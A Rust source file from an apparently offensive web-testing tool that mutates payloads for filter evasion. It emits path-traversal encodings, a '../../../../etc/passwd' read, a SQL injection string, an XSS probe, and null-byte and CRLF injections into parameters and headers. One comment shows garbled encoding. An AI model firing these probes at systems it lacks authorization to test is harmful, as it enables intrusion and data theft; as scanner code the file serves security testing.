// ----------------------------------------------------------------------------
//  mutator.rs — payload mutator
// ----------------------------------------------------------------------------
//  Payload mutator — applies transformations to existing payloads (case, encoding, padding).
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------
//
//
// ---------------------------------------------------------------------------
//   LICENSE / ライセンス — GNU General Public License v3 (GPL-3.0)
// ---------------------------------------------------------------------------
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  This program is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//  GNU General Public License for more details.
//
//  OXIDE v8.7.2-community-edition — HyperSecurityOffensiveLabs
// ---------------------------------------------------------------------------
//
//

//  Mutator: ペイロードミューテータ
//  Applies transformations to base payloads for evasion and coverage.
//  ミューテーション戦略:
//   ➊ mutate_path — 大文字小文字変換URLエンコード../追加
//   ➋ mutate_param — パラメータ値のエンコードNullバイトCRLF注入
//   ➌ mutate_header — ヘッダー値のバリエーション生成
//  各ミューテーションは元のペイロードを含めて返す
pub struct Mutator;

impl Mutator {
    pub fn new() -> Self {
        Self
    }

    //  mutate_path: パスのミューテーション
    //  Generates path traversal variations — case changes, URL encoding, dot-dot sequences.
    //  変換: UPPER/lower, %2f/%252f URLエンコード, ../, %2e%2e
    pub fn mutate_path(&self, path: &str) -> Vec<String> {
        let mut mutations = vec![];
        
        mutations.push(path.to_string());
        mutations.push(path.to_uppercase());
        mutations.push(path.to_lowercase());
        mutations.push(path.replace("/", "%2f"));
        mutations.push(path.replace("/", "%252f"));
        mutations.push(format!("{}/", path));
        mutations.push(format!("{}/.", path));
        mutations.push(format!("{}/..", path));
        mutations.push(format!("{}/../", path));
        mutations.push(format!("{}/%2e%2e/", path));
        
        mutations
    }

    //  mutate_param: パラメータのミューテーション
    //  Generates parameter injection variations — encoding, null byte, CRLF, XSS/SQLi probes.
    //  変換: URLエンコード, 二重エンコード, Nullバイト(%00), CRLF(%0d%0a)
    //   $B$^$?$OG$0$U$j$K(BXSS <script>alert(1)</script> や SQLi ' OR '1'='1 を挿入
    pub fn mutate_param(&self, param: &str) -> Vec<String> {
        let mut mutations = vec![];
        
        mutations.push(param.to_string());
        
        if param.contains('=') {
            let parts: Vec<&str> = param.splitn(2, '=').collect();
            if parts.len() == 2 {
                let key = parts[0];
                let value = parts[1];
                
                mutations.push(format!("{}={}", key, urlencoding::encode(value)));
                mutations.push(format!("{}={}", key, Self::double_encode(value)));
                mutations.push(format!("{}={}%00", key, value));
                mutations.push(format!("{}={}%0d%0a", key, value));
                mutations.push(format!("{}[]={}", key, value));
                mutations.push(format!("{}[0]={}", key, value));
                mutations.push(format!("{}=<script>alert(1)</script>", key));
                mutations.push(format!("{}=' OR '1'='1", key));
                mutations.push(format!("{}=1 AND 1=1", key));
                mutations.push(format!("{}=../../../../etc/passwd", key));
            }
        }
        
        mutations
    }

    //  mutate_header: ヘッダーのミューテーション
    //  Generates HTTP header variations — IP obfuscation, port append, CRLF injection.
    //  変換: [.]ドット置換, .local追加, :80/:443ポート追加, %0d%0aインジェクション
    pub fn mutate_header(&self, header: &str) -> Vec<String> {
        let mut mutations = vec![];
        
        mutations.push(header.to_string());
        
        if header.contains(':') {
            let parts: Vec<&str> = header.splitn(2, ':').collect();
            if parts.len() == 2 {
                let key = parts[0];
                let value = parts[1].trim();
                
                mutations.push(format!("{}: {}", key, value));
                mutations.push(format!("{}: {}", key, value.replace(".", "[.]")));
                mutations.push(format!("{}: {}.local", key, value));
                mutations.push(format!("{}: {}:80", key, value));
                mutations.push(format!("{}: {}:443", key, value));
                mutations.push(format!("{}: null.{}", key, value));
                mutations.push(format!("{}: {}%0d%0a", key, value));
            }
        }
        
        mutations
    }

    fn double_encode(input: &str) -> String {
        urlencoding::encode(&urlencoding::encode(input)).to_string()
    }
}

impl Clone for Mutator {
    fn clone(&self) -> Self {
        Self
    }
}
